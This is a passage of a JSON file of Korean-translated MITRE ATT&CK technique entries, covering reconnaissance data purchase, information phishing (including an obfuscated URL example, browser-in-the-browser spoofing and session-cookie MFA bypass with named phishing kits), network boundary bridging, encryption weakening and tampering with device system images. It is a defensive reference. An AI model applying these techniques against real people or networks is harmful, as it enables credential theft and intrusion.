      "description": "적대자는 목표 설정에 사용할 수 있는 정보를 위해 위협 인텔리전스 공급업체의 개인 데이터를 검색할 수 있습니다. 위협 인텔리전스 공급업체는 공개적으로 보고된 것 이상으로 더 많은 데이터를 제공하는 유료 피드나 포털을 제공할 수 있습니다. 고객 이름 및 기타 식별자와 같은 민감한 세부정보는 삭제될 수 있지만, 이 정보는 목표 산업, 귀속 주장, 성공적인 전술·기법·절차(TTP) 및 대응 조치와 같은 위반에 대한 동향을 포함할 수 있습니다.\n\n적대자는 실행 가능한 정보를 수집하기 위해 개인 위협 인텔리전스 공급업체 데이터를 검색할 수 있습니다. 위협 행위자는 자신의 캠페인에 대해 수집된 정보/지표뿐만 아니라 자신이 목표로 하는 산업, 능력/목표 또는 기타 운영 관련 문제에 부합할 수 있는 다른 적대자에 의해 수행된 정보도 찾을 수 있습니다. 공급업체에서 보고한 정보는 다른 형태의 정찰 기회를 나타낼 수 있으며(예: [공식 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원 확립(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 획득](https://attack.mitre.org/techniques/T1588)), 초기 접근(예: [공개-facing 응용 프로그램 악용](https://attack.mitre.org/techniques/T1190) 또는 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)) 등을 포함합니다.",
      "external_id": "T1597.001",
      "modified": "2021-04-15T03:45:30.862Z",
      "title": "Threat Intel Vendors",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅에 사용할 수 있는 피해자에 대한 기술 정보를 구매할 수 있습니다. 피해자에 대한 정보는 유료 구독을 통해 스캔 데이터베이스 또는 기타 데이터 집계 서비스의 신뢰할 수 있는 개인 소스 및 데이터베이스에서 구매할 수 있습니다. 공격자는 또한 다크 웹이나 사이버 범죄 블랙마켓과 같은 덜 신뢰할 수 있는 소스에서 정보를 구매할 수 있습니다.\n\n공격자는 이미 식별된 타겟에 대한 정보를 구매하거나, 구매한 데이터를 사용하여 성공적인 침해를 위한 기회를 발견할 수 있습니다. 위협 행위자는 구매한 데이터에서 직원 연락처 정보, 자격 증명 또는 피해자의 인프라에 대한 세부 사항 등 다양한 기술 세부 정보를 수집할 수 있습니다. 이러한 출처의 정보는 [정보 피싱](https://attack.mitre.org/techniques/T1598)이나 [열린 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)과 같은 다른 형태의 정찰 기회를 제공할 수 있으며, [능력 개발](https://attack.mitre.org/techniques/T1587)이나 [능력 획득](https://attack.mitre.org/techniques/T1588)과 같은 운영 자원을 확보하는 데 도움이 될 수 있고, [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)나 [유효 계정](https://attack.mitre.org/techniques/T1078)과 같은 초기 접근 방식에도 이용될 수 있습니다.",
      "external_id": "T1597.002",
      "modified": "2021-04-15T03:44:43.900Z",
      "title": "Purchase Technical Data",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 과정에서 사용할 수 있는 민감한 정보를 유도하기 위해 피싱 메시지를 보낼 수 있습니다. 정보를 얻기 위한 피싱은 타겟에게 정보를 공개하도록 속이려는 시도로, 종종 자격 증명이나 다른 실행 가능한 정보를 포함합니다. 정보 수집을 위한 피싱은 피해자로부터 데이터를 수집하는 데 목적이 있다는 점에서 [피싱](https://attack.mitre.org/techniques/T1566)과 다릅니다.\n\n모든 형태의 피싱은 전자적으로 전달되는 사회 공학입니다. 피싱은 특정한 대상을 겨냥할 수 있으며 이를 스피어 피싱이라고 합니다. 스피어 피싱에서는 특정 개인, 회사 또는 산업이 공격자의 표적이 됩니다. 보다 일반적으로, 공격자는 대량 자격 증명 수집 캠페인과 같은 비타겟팅 피싱을 수행할 수 있습니다.\n\n공격자는 이메일, 즉시 메시지 또는 다른 전자적 대화 수단을 통한 정보 교환을 통해 직접 정보를 얻으려 할 수도 있습니다.(인용: ThreatPost 소셜 미디어 피싱)(인용: TrendMicro 피싱)(인용: PCMag 가짜 로그인)(인용: Sophos 첨부파일)(인용: GitHub Phishery) 피해자는 또한 공격자가 기밀 정보를 수집하려고 시도하는 전화번호로 전화를 하도록 유도하는 피싱 메시지를 받을 수 있습니다.(인용: Avertium 콜백 피싱)\n\n정보 수집을 위한 피싱은 종종 정보를 수집할 이유가 있는 출처로 가장하거나(예: [계정 생성](https://attack.mitre.org/techniques/T1585) 또는 [계정 타락](https://attack.mitre.org/techniques/T1586)) 여러 개의 긴급한 메시지를 보내는 등의 사회 공학 기법을 포함합니다. 또 다른 방법은 발신자의 신원을 위조하거나 스푸핑(Citation: Proofpoint-spoof)하여 인간 수신자뿐만 아니라 자동화된 보안 도구를 속이는 것입니다.(Citation: cyberproof-double-bounce)\n\n정보 수집을 위한 피싱은 또한 이메일이나 메타데이터/헤더를 삭제하거나 조작하는 회피 기법을 포함할 수 있으며, 이러한 방법은 메시지를 보내기 위해 악용된 손상된 계정에서 사용하는 것입니다(예: [이메일 숨기기 규칙](https://attack.mitre.org/techniques/T1564/008)).(인용: Microsoft OAuth 스팸 2022)(인용: Palo Alto Unit 42 VBA 정보 탈취 2014)",
      "external_id": "T1598",
      "modified": "2024-05-31T04:18:44.570Z",
      "title": "Phishing for Information",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 과정에서 사용할 수 있는 민감한 정보를 얻기 위해 제3자 서비스를 통해 스피어피싱 메시지를 보낼 수 있습니다. 정보에 대한 스피어피싱은 타겟을 속여 정보, 특히 자격 증명이나 기타 실행 가능한 정보를 자발적으로 공개하게 하려는 시도입니다. 정보에 대한 스피어피싱은 종종 정보를 수집할 이유가 있는 출처로 가장하는 등의 사회 공학 기법이 포함되어 있으며(예: [계정 생성](https://attack.mitre.org/techniques/T1585) 또는 [계정 손상](https://attack.mitre.org/techniques/T1586)) 여러 개의 긴급한 메시지를 보내는 방식으로 진행됩니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 대상으로 한 전자적으로 전달되는 사회 공학입니다. 이 시나리오에서 적대자는 다양한 소셜 미디어 서비스, 개인 웹메일 및 기타 기업이 통제하지 않는 서비스 등을 통해 메시지를 보냅니다(인용: ThreatPost 소셜 미디어 피싱). 이러한 서비스는 기업보다 보안 정책이 덜 엄격할 가능성이 높습니다. 대부분의 스피어피싱과 마찬가지로 목표는 타겟과의 관계를 형성하거나 어떠한 방식으로든 타겟의 관심을 끌기 위한 것입니다. 적대자는 가짜 소셜 미디어 계정을 만들고 직원들에게 잠재적인 직업 기회를 제안하는 메시지를 보낼 수 있습니다. 이를 통해 서비스, 정책 및 환경에 대한 정보를 요청할 수 있는 그럴듯한 이유를 만들 수 있습니다. 또한, 적대자는 이전 정찰 노력에서 얻은 정보를 활용(예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [희생자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594))하여 설득력 있고 믿을 수 있는 유인을 만들어낼 수 있습니다.",
      "external_id": "T1598.001",
      "modified": "2021-04-15T03:43:12.843Z",
      "title": "Spearphishing Service",
      "translated": true
    },
    {
      "description": "적대자는 특정 정보를 유도하기 위해 악성 첨부파일이 포함된 스피어피싱 메시지를 전송할 수 있습니다. 정보 유도를 위한 스피어피싱은 피해자를 속여 정보를 누설하도록 만드는 시도로, 종종 자격 증명이나 기타 실행 가능한 정보를 포함합니다. 정보 유도를 위한 스피어피싱은 종종 정보를 수집할 이유를 가진 출처를 가장하는 사회 공학 기법과 관련되어 있으며 (예: [계정 생성](https://attack.mitre.org/techniques/T1585) 또는 [계정 해킹](https://attack.mitre.org/techniques/T1586)) 여러 번의 시급해 보이는 메시지를 보내는 방식으로 진행됩니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 겨냥한 전자적으로 전달되는 사회 공학적 접근입니다. 이 시나리오에서는 적대자가 스피어피싱 이메일에 파일을 첨부하며, 수신자가 정보를 기입한 후 파일을 반환하는 것에 의존하는 경우가 많습니다. (출처: Sophos Attachment) (출처: GitHub Phishery) 스피어피싱 이메일의 텍스트는 일반적으로 파일을 작성해야 하는 그럴듯한 이유를 제공하려고 하며, 예를 들어 비즈니스 파트너의 정보 요청과 같은 형태로 나타납니다. 적대자는 또한 이전의 정찰 작업에서 수집한 정보를 활용하여 (예: [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594)) 설득력 있고 믿을 수 있는 유인 요소를 만들 수 있습니다.",
      "external_id": "T1598.002",
      "modified": "2024-05-31T04:18:44.568Z",
      "title": "Spearphishing Attachment",
      "translated": true
    },
    {
      "description": "상대방은 지정된 정보 수집을 위해 악성 링크가 포함된 스피어피싱 메시지를 보낼 수 있습니다. 정보에 대한 스피어피싱은 대상이 신뢰할 수 있는 출처를 가장하여 정보, 특히 자격 증명이나 기타 유용한 정보를 공개하도록 유도하는 시도입니다. 정보 수집을 위한 스피어피싱은 종종 정보를 수집할 이유가 있는 출처로 가장하거나([계좌 생성](https://attack.mitre.org/techniques/T1585) 또는 [계좌 손상](https://attack.mitre.org/techniques/T1586)) 긴급한 메시지를 여러 번 보내는 사회 공학 기법이 포함됩니다.\n\n모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 겨냥한 전자적으로 전달되는 사회 공학 기법입니다. 이 시나리오에서는 악성 이메일에 사회 공학적인 텍스트와 함께 사용자가 링크를 클릭하거나 URL을 브라우저에 복사하여 붙여넣도록 유도하는 링크가 포함되어 있습니다. 주어진 웹사이트는 합법적인 사이트(예: 온라인 또는 기업 로그인 포털)의 복제본일 수도 있고, 또는 실제 사이트의 요소를 포함한 URL을 가진 유사한 사이트일 수도 있습니다. URL은 정수 또는 16진수 기반 호스트 이름 형식의 수용과 '@' 기호 이전의 텍스트를 자동으로 폐기하는 URL 스키마의 특징을 이용하여 숨겨질 수도 있습니다. 예를 들어, `hxxp://google.com@1157586937`와 같은 형식입니다.\n\n상대방은 또한 피싱 메시지 내에 '추적 픽셀', '웹 버그' 또는 '웹 비콘'을 내장하여 이메일 수신 여부를 확인하고 피해자의 IP 주소와 같은 정보를 프로파일링하고 추적할 수 있습니다. 이러한 메커니즘은 종종 크기가 1픽셀인 작은 이미지 또는 다른 방식으로 숨겨진 객체로 나타나며, 일반적으로 원격 서버에 대한 링크가 포함된 HTML 코드로 전달됩니다.\n\n상대방은 \"브라우저 내 브라우저\" (BitB) 공격을 통해 전체 웹사이트를 스푸핑할 수도 있습니다. HTML 기반 주소 표시줄이 포함된 가짜 브라우저 팝업 창을 생성하여 합법적인 URL(예: 인증 포털)을 표시함으로써 사용자에게 자격 증명을 입력하도록 유도할 수 있으며, 일반적인 URL 확인 방법을 우회할 수 있습니다.\n\n상대방은 `EvilProxy` 및 `Evilginx2`와 같은 피싱 키트를 사용하여 중간자 공격을 수행하며, 피해자와 합법적인 웹사이트 간의 연결을 프록시합니다. 성공적인 로그인 시 피해자는 합법적인 웹사이트로 리디렉션되지만, 상대방은 사용자 이름과 비밀번호뿐만 아니라 세션 쿠키를 캡처합니다. 이를 통해 상대방은 [웹 세션 쿠키](https://attack.mitre.org/techniques/T1550/004)를 통해 MFA를 우회할 수 있습니다.\n\n상대방은 또한 QR 코드의 형태로 악성 링크를 보낼 수 있습니다. 이러한 링크는 피해자를 자격 증명 피싱 페이지로 안내합니다. QR 코드를 사용하면 이메일에서 URL이 노출되지 않아 대부분의 자동 이메일 보안 스캔에서 탐지되지 않을 수 있습니다. 이러한 QR 코드는 사용자의 모바일 장치에 스캔되거나 직접 전달될 수 있으며, 이는 여러 가지 관련 방식에서 덜 안전할 수 있습니다. 예를 들어, 모바일 사용자는 모바일의 작은 크기로 인해 합법적인 사이트와 자격 증명을 수집하는 사이트 간의 미세한 차이를 인식하지 못할 수 있습니다.\n\n가짜 웹사이트에서 수집된 정보는 웹 양식을 통해 상대방에게 전송됩니다. 상대방은 또한 이전 정찰 노력에서 수집된 정보([공식 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [피해자 소유의 웹사이트 검색](https://attack.mitre.org/techniques/T1594))를 사용하여 설득력 있고 믿을 수 있는 유인을 생성할 수 있습니다.",
      "external_id": "T1598.003",
      "modified": "2024-05-31T04:18:44.567Z",
      "title": "Spearphishing Link",
      "translated": true
    },
    {
      "description": "위협 행위자는 음성 통신을 사용하여 목표를 설정하는 데 사용할 수 있는 민감한 정보를 유도할 수 있습니다. 정보를 얻기 위한 맞춤형 피싱은 목표가 정보를 공개하도록 속이려는 시도로, 종종 자격 증명이나 기타 실행 가능한 정보를 포함합니다. 정보 피싱은 종종 정보를 수집할 이유가 있는 출처로 가장하는 것(예: [사칭](https://attack.mitre.org/techniques/T1656))이나 수신자에게 긴급성이나 경각심을 느끼게 하는 기술을 포함합니다.\n\n모든 형태의 피싱은 전자적으로 전달되는 사회 공학입니다. 이 시나리오에서 위협 행위자는 전화를 통해 피해자로부터 민감한 정보를 유도합니다. '음성 피싱'(또는 \"비싱\")이라고 불리며, 이러한 통신은 위협 행위자, 고용된 콜 센터, 또는 심지어 로보콜을 통해 자동화될 수 있습니다. 음성 피싱 공격자는 신뢰할 수 있는 주체인 사업 파트너나 기술 지원 직원으로 가장하면서 전화 번호를 스푸핑할 수 있습니다. (출처: BOA 전화 사기)\n\n피해자는 또한 특정 전화 번호로 전화하도록 유도하는 피싱 메시지를 받을 수 있으며(\"콜백 피싱\"), 여기에서 위협 행위자가 기밀 정보를 수집하려고 시도합니다. (출처: Avertium 콜백 피싱)\n\n위협 행위자는 또한 이전 정보 수집 노력을 통해 얻은 정보(예: [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594))를 사용하여 피해자에게 더욱 설득력 있고 믿을 수 있도록 전제를 맞춤화할 수 있습니다.",
      "external_id": "T1598.004",
      "modified": "2023-09-08T21:03:35.477Z",
      "title": "Spearphishing Voice",
      "translated": true
    },
    {
      "description": "적대 세력은 경계 네트워크 장치나 네트워크 분할을 담당하는 내부 장치를 손상시킴으로써 네트워크 경계를 넘을 수 있습니다. 이러한 장치를 침투하면 신뢰된 네트워크와 신뢰되지 않은 네트워크를 구분하는 트래픽 라우팅에 대한 제한을 우회할 수 있게 됩니다.\n\n라우터와 방화벽과 같은 장치는 신뢰된 네트워크와 신뢰되지 않은 네트워크 간의 경계를 생성하는 데 사용됩니다. 이들은 트래픽 유형을 제한하여 조직 정책을 시행함으로써 이러한 연결에서 내재된 위험을 줄이려고 합니다. 트래픽 제한은 IP 주소, 레이어 4 프로토콜 포트를 금지하거나 애플리케이션을 식별하기 위한 깊은 패킷 검사(deep packet inspection)를 통해 이루어질 수 있습니다. 이러한 장치는 네트워크와의 상호작용을 위해 직접 주소 지정이 가능하거나 투명하게 운영될 수 있지만, 적대 세력이 손상시켰을 때 어떻게 우회할 수 있는지는 운영 방식에 영향을 받지 않습니다.\n\n적대 세력이 이러한 경계 장치를 장악하면 해당 장치의 정책 시행을 우회하여 두 개의 분리된 네트워크 간의 신뢰 경계를 넘어 일반적으로 금지된 트래픽을 방해 없이 전달할 수 있습니다. 장치에서 충분한 권한을 확보하면 적대 세력은 원하는 트래픽을 허용하도록 장치를 재구성할 수 있으며, 이를 통해 [다단계 프록시](https://attack.mitre.org/techniques/T1090/003)를 통한 명령 및 제어 또는 [트래픽 복제](https://attack.mitre.org/techniques/T1020/001)를 통한 데이터 유출과 같은 추가 목표를 달성할 수 있습니다. 또한 적대 세력은 네트워크 분할을 담당하는 내부 장치를 타겟으로 삼아 [내부 프록시](https://attack.mitre.org/techniques/T1090/001)와 함께 사용하여 동일한 목표를 달성할 수 있습니다. (출처: Kaspersky ThreatNeedle 2021년 2월) 경계 장치가 두 개의 서로 다른 조직을 분리하는 경우, 적대 세력은 새로운 피해 환경으로의 측면 이동을 촉진할 수도 있습니다.",
      "external_id": "T1599",
      "modified": "2022-05-05T05:05:44.200Z",
      "title": "Network Boundary Bridging",
      "translated": true
    },
    {
      "description": "위협 행위자는 네트워크 장치의 네트워크 주소 변환(NAT) 구성을 수정하여 네트워크 경계를 넘을 수 있습니다. NAT에 대한 악의적인 수정은 위협 행위자가 신뢰된 네트워크와 비신뢰 네트워크를 분리하는 트래픽 라우팅의 제한을 우회할 수 있게 할 수 있습니다.\n\n라우터 및 방화벽과 같은 네트워크 장치는 여러 네트워크를 연결하는 과정에서 NAT를 구현할 수 있습니다. NAT를 수행할 때, 네트워크 장치는 IP 주소 헤더의 출발지 및/또는 목적지 주소를 변경합니다. 일부 네트워크 설계에서는 패킷이 경계 장치를 통과하기 위해 NAT가 필요합니다. 일반적인 예로는 내부 네트워크가 비인터넷 라우팅 주소를 사용하는 환경이 있습니다.(참조: RFC1918)\n\n위협 행위자가 네트워크 경계 장치의 제어를 획득하게 되면, 그들은 기존의 NAT 구성을 이용하여 두 개의 분리된 네트워크 간의 트래픽을 전송하거나 자신들의 설계에 맞는 NAT 구성을 구현할 수 있습니다. NAT가 기능하기 위해 필요한 네트워크 설계의 경우, 이는 위협 행위자가 경계 장치 뒤에 있는 보호된 시스템에 접근하는 것을 방지하는 본래의 라우팅 제한을 극복할 수 있게 해 줍니다. NAT가 필요하지 않은 네트워크 설계의 경우, 주소 변환은 위협 행위자가 자신의 활동을 불투명하게 만드는 데 사용될 수 있습니다. 네트워크 경계 장치를 통과하는 패킷의 주소를 변경함으로써 방어자가 데이터 전송을 모니터링하는 것이 더 어려워질 수 있습니다.\n\n위협 행위자는 [패치 시스템 이미지](https://attack.mitre.org/techniques/T1601/001)를 사용하여 네트워크 장치의 운영 체제를 변경하고, 자신의 맞춤형 NAT 메커니즘을 구현하여 활동을 더욱 불투명하게 만들 수 있습니다.",
      "external_id": "T1599.001",
      "modified": "2020-10-21T01:45:58.951Z",
      "title": "Network Address Translation Traversal",
      "translated": true
    },
    {
      "description": "공격자는 데이터 통신을 보호하는 암호화를 우회하기 위해 네트워크 장치의 암호화 기능을 손상시킬 수 있습니다. (인용: Cisco Synful Knock Evolution)\n\n암호화는 전송된 네트워크 트래픽을 보호하여 기밀성을 유지하고 (무단 공개 방지) 무결성을 보장합니다 (무단 변경 방지). 암호화 알고리즘은 평문 메시지를 암호문으로 변환하는 데 사용되며, 연결된 복호화 키 없이 해독하는 데 많은 계산 자원이 소모될 수 있습니다. 일반적으로, 더 긴 키는 키 없이 암호 분석 혹은 복호화의 비용을 증가시킵니다.\n\n공격자는 네트워크 트래픽을 암호화하는 장치를 손상시키거나 조작할 수 있습니다. 예를 들어, [시스템 이미지 수정](https://attack.mitre.org/techniques/T1601), [키 공간 축소](https://attack.mitre.org/techniques/T1600/001), [암호 하드웨어 비활성화](https://attack.mitre.org/techniques/T1600/002)와 같은 행동을 통해 공격자는 장치의 네트워크 트래픽을 안전하게 암호화하는 능력에 부정적인 영향을 미치거나 이를 제거할 수 있습니다. 이는 무단 공개의 위험을 증가시키고 데이터 조작, 자격 증명 접근 또는 수집 작업을 용이하게 할 수 있습니다. (인용: Cisco Blog Legacy Device Attacks)",
      "external_id": "T1600",
      "modified": "2020-10-21T22:37:49.258Z",
      "title": "Weaken Encryption",
      "translated": true
    },
    {
      "description": "공격자는 네트워크를 통해 전송된 데이터를 해독하는 데 필요한 노력을 줄이기 위해 암호화 통신의 암호 강도를 낮출 수 있습니다. (출처: Cisco Synful Knock Evolution)\n\n공격자는 손상된 네트워크 장치의 암호화 소프트웨어에서 평문을 암호문으로 변환하는 데 사용하는 키 크기를 줄임으로써 암호화 소프트웨어를 약화시킬 수 있습니다 (예: 수백 또는 수천 바이트에서 불과 몇 바이트로). 이로 인해 공격자는 키 없이 보호된 정보를 해독하는 데 필요한 노력을 급격히 줄일 수 있습니다.\n\n공격자는 시스템에 도입된 [Modify System Image](https://attack.mitre.org/techniques/T1601)를 통해 특정 명령어를 사용하여 사용되는 키 크기 및 기타 암호화 매개변수를 수정하여 장치의 구성을 변경할 수 있습니다. (출처: Cisco Blog Legacy Device Attacks)",
      "external_id": "T1600.001",
      "modified": "2020-10-21T22:36:22.369Z",
      "title": "Reduce Key Space",
      "translated": true
    },
    {
      "description": "적대적인 공격자는 네트워크 장치의 전용 하드웨어 암호화를 비활성화하여 소프트웨어 암호화의 약점을 이용해 전송된 데이터를 수집, 조작 및 유출하는 데 필요한 노력을 줄일 수 있습니다.\n\n라우터, 스위치 및 방화벽과 같은 많은 네트워크 장치는 네트워크 간의 안전한 전송을 위해 네트워크 트래픽을 암호화합니다. 이러한 장치들은 암호화 프로세스의 속도를 크게 향상시키고 악의적인 변조를 방지하기 위해 특수한 전용 암호화 하드웨어를 갖추고 있습니다. 공격자가 이러한 장치를 제어하게 되면, [시스템 이미지 수정(Modify System Image)](https://attack.mitre.org/techniques/T1601)와 같은 방법을 통해 전용 하드웨어를 비활성화하고, 일반 프로세서에서 소프트웨어를 사용하여 암호화하도록 강제할 수 있습니다. 이는 일반적으로 소프트웨어에서 암호의 강도를 약화하기 위한 공격과 함께 사용됩니다 (예: [키공간 축소(Reduce Key Space)](https://attack.mitre.org/techniques/T1600/001)). (출처: Cisco 블로그 레거시 장치 공격)",
      "external_id": "T1600.002",
      "modified": "2020-10-21T22:37:48.503Z",
      "title": "Disable Crypto Hardware",
      "translated": true
    },
    {
      "description": "적대적 행위자는 방어력을 약화시키고 자신에게 새로운 기능을 제공하기 위해 임베디드 네트워크 장치의 운영 체제를 변경할 수 있습니다. 이러한 장치에서는 운영 체제가 일반적으로 모놀리식이며, 대부분의 장치 기능과 능력이 단일 파일 내에 포함되어 있습니다.\n\n운영 체제를 변경하기 위해 적대자는 일반적으로 이 하나의 파일에만 영향을 미치면 됩니다. 이를 대체하거나 수정하는 방식으로 이루어질 수 있습니다. 이러한 변경은 시스템 실행 중에 메모리에서 실시간으로 적용하거나 저장 장치에서 변경하여 네트워크 장치의 다음 부팅 시에 적용할 수 있습니다.",
      "external_id": "T1601",
      "modified": "2020-10-22T17:50:47.635Z",
      "title": "Modify System Image",
      "translated": true
    },
    {
      "description": "적대자는 네트워크 장치의 운영 체제를 수정하여 새로운 기능을 도입하거나 기존 방어력을 약화시킬 수 있습니다. 일부 네트워크 장치는 단일 파일 내에 전체 운영 체제와 장치의 대부분의 기능이 포함된 단일 아키텍처로 설계되어 있습니다. 적대자는 이 파일을 저장소에서 변경하여 향후 부팅 시 로드되도록 하거나 실행 중에 메모리에서 변경할 수 있습니다.\n\n저장소의 운영 체제를 변경하기 위해 적대자는 일반적으로 장치 운영자에게 제공되는 표준 절차를 사용할 것입니다. 이는 TFTP, FTP, SCP 또는 콘솔 연결과 같은 네트워크 장치에서 사용하는 일반적인 프로토콜을 통해 새로운 파일을 다운로드하는 것을 포함할 수 있습니다. 원본 파일이 덮어쓰여지거나, 새로운 파일이 원본 파일과 그 옆에 기록되고, 장치가 손상된 이미지를 부팅하도록 재구성될 수 있습니다.\n\n메모리에서 운영 체제를 변경하기 위해 적대자는 일반적으로 두 가지 방법 중 하나를 사용할 수 있습니다. 첫 번째 방법에서는 적대자가 원본의 변경되지 않은 실행 중인 운영 체제에서 직접 운영 체제를 수정할 수 있는 네이티브 디버그 명령을 사용할 것입니다. 이 방법은 일반적으로 장치에 대한 관리 수준의 접근이 필요합니다.\n\n운영 체제를 메모리에서 변경하는 두 번째 방법에서는 적대자가 부트 로더를 사용할 것입니다. 부트 로더는 장치가 시작될 때 가장 먼저 로드되는 소프트웨어로 흐름을 통해 운영 체제를 시작하게 됩니다. 적대자는 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 방법을 통해 부트 로더에 이전에 심은 악성 코드를 사용하여 메모리에서 실행 중인 운영 체제 코드를 직접 조작할 수 있습니다. 부트 로더의 이 악성 코드는 적대자에게 직접 메모리를 조작할 수 있는 능력을 제공하여, 실행 중인 운영 체제를 패치할 수 있게 합니다.\n\n저장된 시스템 이미지 파일에 저장된 명령을 수정함으로써 적대자는 기존 방어력을 약화시키거나 장치에 없었던 새로운 기능을 제공할 수 있습니다. 약화된 방어력의 예로는 [암호화 약화](https://attack.mitre.org/techniques/T1600), [네트워크 장치 인증](https://attack.mitre.org/techniques/T1556/004) 및 [망 경계 브리징](https://attack.mitre.org/techniques/T1599)을 통한 인증이 있습니다. 적대자의 목적을 위한 새로운 기능의 추가에는 [키로깅](https://attack.mitre.org/techniques/T1056/001), [멀티 홉 프록시](https://attack.mitre.org/techniques/T1090/003) 및 [포트 노킹](https://attack.mitre.org/techniques/T1205/001)이 포함됩니다.\n\n또한 적대자는 운영 체제의 기존 명령을 손상시켜 방어자를 오도하는 잘못된 출력을 생성할 수 있습니다. 이 방법이 [시스템 이미지 다운그레이드](https://attack.mitre.org/techniques/T1601/002)와 함께 사용될 때는, 예를 들어 현재 실행 중인 운영 체제의 버전을 보여주는 명령의 출력을 변경할 수 있습니다. 운영 체제를 패치함으로써 적대자는 이 명령을 변경하여 대신 원본의 높은 개정 번호를 표시하도록 할 수 있습니다.\n\n운영 체제가 저장소에서 패치될 때, 이는 거주 저장소(일반적으로 비휘발성 플래시 메모리 형태)에서 수행되거나 [TFTP 부팅](https://attack.mitre.org/techniques/T1542/005)을 통해 수행될 수 있습니다.\n\n이 기술이 메모리에서 실행 중인 운영 체제에 대해 수행되고 저장된 복사본이 아닌 경우, 이 기술은 재부팅 시 지속되지 않습니다. 그러나 운영 체제의 실시간 메모리 수정은 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)와 결합되어 지속성을 달성할 수 있습니다.",
      "external_id": "T1601.001",
      "modified": "2020-10-22T17:50:46.560Z",
      "title": "Patch System Image",
      "translated": true
    },
    {
      "description": "적대자는 보안을 약화시키기 위해 네트워크 장치의 운영 체제의 이전 버전을 설치할 수 있습니다. 네트워크 장치에서 구버전의 운영 체제는 일반적으로 더 약한 암호화 암호를 가지고 있으며, 방어 기능도 적거나 업데이트가 덜 되어 있는 경우가 많습니다. (출처: Cisco Synful Knock Evolution)\n\n임베디드 장치에서는 버전 다운그레이드가 일반적으로 저장소의 운영 체제 파일을 교체하는 것만으로 이루어집니다. 대부분의 임베디드 장치에서는 원하는 운영 체제 파일의 복사본을 다운로드하고, 장치가 다음 시스템 재시작 시 해당 파일에서 부팅하도록 다시 구성함으로써 이를 달성할 수 있습니다. 그 이후 적대자는 장치를 재시작하여 즉시 변경사항을 적용하거나, 시스템이 다음 번에 재시작될 때까지 기다릴 수 있습니다.\n\n시스템 이미지를 구버전으로 다운그레이드하는 것은 적대자가 [암호화 약화](https://attack.mitre.org/techniques/T1600)와 같은 동작을 활성화하여 방어를 회피할 수 있도록 할 수 있습니다. 시스템 이미지의 다운그레이드는 독립적으로 수행될 수 있으며, [시스템 이미지 패치](https://attack.mitre.org/techniques/T1601/001)와 결합하여 사용될 수도 있습니다.",
      "external_id": "T1601.002",
      "modified": "2020-10-22T17:49:02.660Z",
      "title": "Downgrade System Image",
      "translated": true
    },
    {
      "description": "적대자는 구성 리포지토리에서 관리되는 장치와 관련된 데이터를 수집할 수 있습니다. 구성 리포지토리는 관리 시스템에서 원격 시스템의 데이터 구성, 관리 및 제어를 위해 사용됩니다. 구성 리포지토리는 또한 장치에 대한 원격 액세스 및 관리 기능을 제공할 수 있습니다.\n\n적대자는 이러한 리포지토리를 목표로 하여 대량의 민감한 시스템 관리 데이터를 수집할 수 있습니다. 구성 리포지토리에서의 데이터는 다양한 프로토콜과 소프트웨어에 의해 노출될 수 있으며, 매우 다양한 데이터를 저장할 수 있습니다. 이 데이터의 상당 부분은 적대자의 탐색(Discovery) 목표와 일치할 수 있습니다. (인용: US-CERT-TA18-106A)(인용: US-CERT TA17-156A SNMP 남용 2017)",
      "external_id": "T1602",
      "modified": "2022-04-19T21:32:58.274Z",
      "title": "Data from Configuration Repository",
      "translated": true
    },
    {
      "description": "적대자들은 단순 네트워크 관리 프로토콜(SNMP)을 사용하여 관리되는 네트워크에서 가치 있는 정보를 수집하고/하거나 채굴하기 위해 관리 정보 베이스(MIB)를 표적할 수 있습니다.\n\nMIB는 SNMP를 통해 접근할 수 있는 변수 정보를 저장하는 구성 저장소로, 객체 식별자(OID)의 형태로 구성됩니다. 각 OID는 읽거나 설정할 수 있는 변수를 식별하며, 이러한 변수의 원격 수정을 통해 구성 변경과 같은 능동적인 관리 작업을 허용합니다. SNMP는 관리자에게 시스템에 대한 중요한 통찰력을 제공할 수 있으며, 시스템 정보, 하드웨어 설명, 물리적 위치 및 소프트웨어 패키지 등을 포함합니다(출처: SANS 정보 보안 독서실 SNMP 보안). MIB는 또한 실행 중인 구성, 라우팅 테이블 및 인터페이스 세부 사항을 포함하는 장치 운영 정보도 포함할 수 있습니다.\n\n적대자들은 SNMP 쿼리를 활용하여 SNMP 관리 장치에서 직접 MIB 내용을 수집함으로써, 적대자가 네트워크 맵을 구축하고 향후 표적 생성에 도움을 줄 수 있는 네트워크 정보를 수집할 수 있습니다.(출처: US-CERT-TA18-106A)(출처: Cisco 블로그 레거시 장치 공격)",
      "external_id": "T1602.001",
      "modified": "2020-10-22T01:54:22.812Z",
      "title": "SNMP (MIB Dump)",
      "translated": true
    },
    {
